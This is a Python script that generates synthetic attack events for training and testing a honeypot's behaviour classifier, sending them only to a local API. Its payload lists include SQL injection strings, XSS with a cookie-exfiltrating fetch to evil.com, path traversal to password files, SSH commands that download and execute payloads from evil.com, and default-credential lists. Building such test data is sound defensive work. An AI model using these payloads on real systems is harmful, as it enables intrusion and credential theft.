# synthetic/attack_generator.py
#
# Synthetic attack generator for testing and ML training.
#
# USAGE:
#   # Continuous mode (default) - runs until Ctrl+C
#   python -m synthetic.attack_generator
#
#   # One-shot mode - sends one event per attacker and exits
#   python -m synthetic.attack_generator --once
#
#   # Custom interval between events (seconds)
#   python -m synthetic.attack_generator --interval 2
#
#   # Custom number of simulated attacker IPs
#   python -m synthetic.attack_generator --ip-count 10

import time
import random
import requests
import argparse
from datetime import datetime

CORE_EVENT_API = "http://127.0.0.1:5001/event"

# ─────────────────────────────────────────────
# PAYLOAD POOLS
# Varied payloads so ML model sees diversity
# ─────────────────────────────────────────────

SQLI_PAYLOADS = [
    "admin' OR 1=1 --",
    "' OR 'x'='x",
    "1; DROP TABLE users --",
    "' UNION SELECT username, password FROM users --",
    "admin'--",
    "1' AND SLEEP(5)--",
    "' OR 1=1#",
    "') OR ('1'='1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    '"><script>fetch("http://evil.com?c="+document.cookie)</script>',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
]

SSH_COMMANDS = [
    "ls -la /",
    "whoami",
    "cat /etc/passwd",
    "uname -a",
    "ps aux",
    "netstat -an",
    "find / -perm -4000 2>/dev/null",
    "wget http://evil.com/shell.sh",
    "curl http://evil.com/payload -o /tmp/p",
    "chmod +x /tmp/p && /tmp/p",
]

SSH_BRUTE_USERS = ["root", "admin", "ubuntu", "pi", "user", "test", "guest"]
SSH_BRUTE_PASSWORDS = ["password", "123456", "admin", "root", "toor", "pass", "qwerty"]

BENIGN_ENDPOINTS = ["/", "/index.html", "/about", "/contact", "/favicon.ico"]
BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "curl/7.68.0",
]

# ─────────────────────────────────────────────
# ATTACKER PROFILES
# Each profile has a behaviour pattern that
# maps to what the behaviour classifier expects
# ─────────────────────────────────────────────

PROFILES = {
    "automated_scanner": {
        # Fires fast, lots of SQLi and path traversal
        "weight": 0.3,
        "interval_range": (0.5, 2.0),
        "attack_mix": [
            ("HTTP_SQLI_ATTEMPT", 0.5),
            ("HTTP_PATH_TRAVERSAL", 0.3),
            ("SSH_BRUTE_FORCE", 0.2),
        ],
    },
    "persistent_attacker": {
        # Slower, more varied, escalates over time
        "weight": 0.4,
        "interval_range": (3.0, 8.0),
        "attack_mix": [
            ("SSH_COMMAND", 0.4),
            ("HTTP_SQLI_ATTEMPT", 0.3),
            ("SSH_BRUTE_FORCE", 0.2),
            ("HTTP_PATH_TRAVERSAL", 0.1),
        ],
    },
    "casual_probe": {
        # Single probes, mostly benign with occasional attack
        "weight": 0.3,
        "interval_range": (5.0, 15.0),
        "attack_mix": [
            ("BENIGN", 0.6),
            ("HTTP_SQLI_ATTEMPT", 0.2),
            ("HTTP_XSS_ATTEMPT", 0.2),
        ],
    },
}

# ─────────────────────────────────────────────
# IP POOL
# Simulates multiple attackers with assigned profiles
# ─────────────────────────────────────────────

def generate_ip_pool(count: int) -> list:
    """Generate a pool of attacker IPs each assigned a profile."""
    profile_names = list(PROFILES.keys())
    weights = [PROFILES[p]["weight"] for p in profile_names]

    pool = []
    for i in range(count):
        ip = f"10.0.{random.randint(0, 9)}.{random.randint(1, 254)}"
        profile = random.choices(profile_names, weights=weights, k=1)[0]
        pool.append({"ip": ip, "profile": profile, "event_count": 0})

    return pool


# ─────────────────────────────────────────────
# EVENT BUILDERS
# ─────────────────────────────────────────────

def build_event(event_type: str, ip: str) -> dict:
    """Build a realistic event payload for a given event type."""

    if event_type == "HTTP_SQLI_ATTEMPT":
        return {
            "event_type": "HTTP_SQLI_ATTEMPT",
            "details": {
                "endpoint": random.choice(["/login", "/search", "/user", "/api/data"]),
                "payload": random.choice(SQLI_PAYLOADS),
                "client_ip": ip,
                "method": "GET",
            }
        }

    elif event_type == "HTTP_XSS_ATTEMPT":
        return {
            "event_type": "HTTP_XSS_ATTEMPT",
            "details": {
                "endpoint": random.choice(["/search", "/comment", "/profile"]),
                "payload": random.choice(XSS_PAYLOADS),
                "client_ip": ip,
                "method": "POST",
            }
        }

    elif event_type == "HTTP_PATH_TRAVERSAL":
        return {
            "event_type": "HTTP_PATH_TRAVERSAL",
            "details": {
                "endpoint": "/download",
                "payload": random.choice(PATH_TRAVERSAL_PAYLOADS),
                "client_ip": ip,
                "method": "GET",
            }
        }

    elif event_type == "SSH_COMMAND":
        return {
            "event_type": "SSH_COMMAND",
            "details": {
                "command": random.choice(SSH_COMMANDS),
                "client_ip": ip,
            }
        }

    elif event_type == "SSH_BRUTE_FORCE":
        return {
            "event_type": "SSH_BRUTE_FORCE",
            "details": {
                "username": random.choice(SSH_BRUTE_USERS),
                "password": random.choice(SSH_BRUTE_PASSWORDS),
                "client_ip": ip,
            }
        }

    elif event_type == "SSH_LOGIN_ATTEMPT":
        return {
            "event_type": "SSH_LOGIN_ATTEMPT",
            "details": {
                "username": random.choice(SSH_BRUTE_USERS),
                "password": random.choice(SSH_BRUTE_PASSWORDS),
                "client_ip": ip,
            }
        }

    elif event_type == "BENIGN":
        return {
            "event_type": "HTTP_REQUEST",
            "details": {
                "endpoint": random.choice(BENIGN_ENDPOINTS),
                "payload": "",
                "client_ip": ip,
                "method": "GET",
                "user_agent": random.choice(BENIGN_UAS),
            }
        }

    # Fallback
    return {
        "event_type": event_type,
        "details": {"client_ip": ip}
    }


def pick_event_type(profile_name: str) -> str:
    """Pick an event type based on attacker profile weights."""
    profile = PROFILES[profile_name]
    types = [t for t, _ in profile["attack_mix"]]
    weights = [w for _, w in profile["attack_mix"]]
    return random.choices(types, weights=weights, k=1)[0]


# ─────────────────────────────────────────────
# CORE API COMMUNICATION
# ─────────────────────────────────────────────

def wait_for_core(max_retries: int = 50, delay: int = 3):
    """Wait until the core API is reachable before sending events."""
    print(f"[SYNTHETIC] Waiting for core API at {CORE_EVENT_API}...")

    for attempt in range(1, max_retries + 1):
        try:
            r = requests.get(
                CORE_EVENT_API.replace("/event", "/control/http/status"),
                timeout=2
            )
            if r.status_code == 200:
                print("[SYNTHETIC] Core API is ready.")
                return True
        except Exception:
            pass

        print(f"[SYNTHETIC] Attempt {attempt}/{max_retries} — core not ready, retrying in {delay}s...")
        time.sleep(delay)

    print("[SYNTHETIC] ERROR: Core API unreachable after all retries. Is it running?")
    return False


def send_event(event: dict) -> bool:
    """Send a single event to the core API. Returns True on success."""
    try:
        payload = {**event, "synthetic": True}
        r = requests.post(CORE_EVENT_API, json=payload, timeout=30)
        return r.status_code == 200
    except Exception:
        return False


# ─────────────────────────────────────────────
# GENERATOR
# ─────────────────────────────────────────────

class SyntheticAttackGenerator:

    def __init__(self, interval: float = 5.0, ip_count: int = 20):
        self.interval = interval
        self.ip_count = ip_count
        self.running = False
        self.ip_pool = generate_ip_pool(ip_count)
        self.sent = 0
        self.failed = 0

    def _send_one(self, attacker: dict) -> None:
        """Pick and send one event for a given attacker."""
        event_type = pick_event_type(attacker["profile"])
        event = build_event(event_type, attacker["ip"])

        success = send_event(event)
        attacker["event_count"] += 1

        status = "✓" if success else "✗"
        ts = datetime.now().strftime("%H:%M:%S")

        print(
            f"[{ts}] {status} {event['event_type']:<25} "
            f"IP={attacker['ip']:<16} "
            f"profile={attacker['profile']}"
        )

        if success:
            self.sent += 1
        else:
            self.failed += 1

    def run_once(self) -> None:
        """Send exactly one event per attacker IP and exit. Good for quick testing."""
        print(f"[SYNTHETIC] One-shot mode — sending {self.ip_count} events...")

        if not wait_for_core():
            return

        for attacker in self.ip_pool:
            self._send_one(attacker)

        print(f"\n[SYNTHETIC] Done. Sent: {self.sent}  Failed: {self.failed}")

    def start(self) -> None:
        """Continuous mode — sends events until Ctrl+C."""
        print(f"[SYNTHETIC] Continuous mode — interval={self.interval}s, IPs={self.ip_count}")
        print("[SYNTHETIC] Press Ctrl+C to stop.\n")

        if not wait_for_core():
            return

        self.running = True

        try:
            while self.running:
                # Pick a random attacker from the pool each tick
                attacker = random.choice(self.ip_pool)

                # Add slight jitter to interval so timing isn't perfectly regular
                jitter = random.uniform(-self.interval * 0.2, self.interval * 0.2)
                sleep_time = max(0.5, self.interval + jitter)

                self._send_one(attacker)
                time.sleep(sleep_time)

        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        self.running = False
        print(f"\n[SYNTHETIC] Stopped. Total sent: {self.sent}  Failed: {self.failed}")


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Synthetic attack generator for Behaviour-Aware Honeypot"
    )
    parser.add_argument(
        "--once",
        action="store_true",
        help="Send one event per IP and exit (good for quick testing)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=5.0,
        help="Seconds between events in continuous mode (default: 5)"
    )
    parser.add_argument(
        "--ip-count",
        type=int,
        default=20,
        help="Number of simulated attacker IPs (default: 20)"
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    generator = SyntheticAttackGenerator(
        interval=args.interval,
        ip_count=args.ip_count,
    )

    if args.once:
        generator.run_once()
    else:
        generator.start()